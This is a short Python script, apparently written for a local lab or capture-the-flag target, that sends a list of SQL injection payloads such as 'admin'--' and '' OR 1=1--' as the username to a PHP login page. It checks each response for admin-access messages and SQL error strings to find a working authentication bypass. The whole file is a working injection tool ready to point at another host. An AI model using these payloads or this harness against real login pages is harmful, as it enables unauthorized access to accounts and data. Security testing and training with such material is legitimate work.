import requests, urllib.parse, sys

test_url="http://127.0.0.1:33148/index.php"

payloads=[
    ("admin%23","admin%23"),
    ("admin'--","admin%27--"),
    ("admin' OR '1'='1","admin%27+OR+%271%27%3D%271"),
    ("admin' AND 1=1--","admin%27+AND+1%3D1--"),
    ("admin\\' OR 1=1--","admin%5C%27+OR+1%3D1--"),
    ("' OR 1=1--","%27+OR+1%3D1--")
]

print("AUTHENTICATION BYPASS TEST")
print("Target: "+test_url)
print()

for name,enc in payloads:
    try:
        r=requests.get(test_url,params={"username":urllib.parse.unquote(enc)},timeout=10)
        body=r.text.lower()
        not_admin="you are not the admin" in body
        success="you are the admin" in body
        sql_err="sql" in body or "syntax" in body or "mysql" in body
        print(f"Payload: {name}")
        print(f"  Status: {r.status_code}")
        print(f"  Length: {len(body)}")
        print(f"  Not Admin: {not_admin}")
        print(f"  Success: {success}")
        print(f"  SQL Error: {sql_err}")
        if not not_admin and not sql_err:
            print(f"  [!] MESSAGE CHANGED - investigate this payload!")
        print()
    except Exception as e:
        print(f"Payload: {name} - ERROR: {e}\n")

print("Test complete")
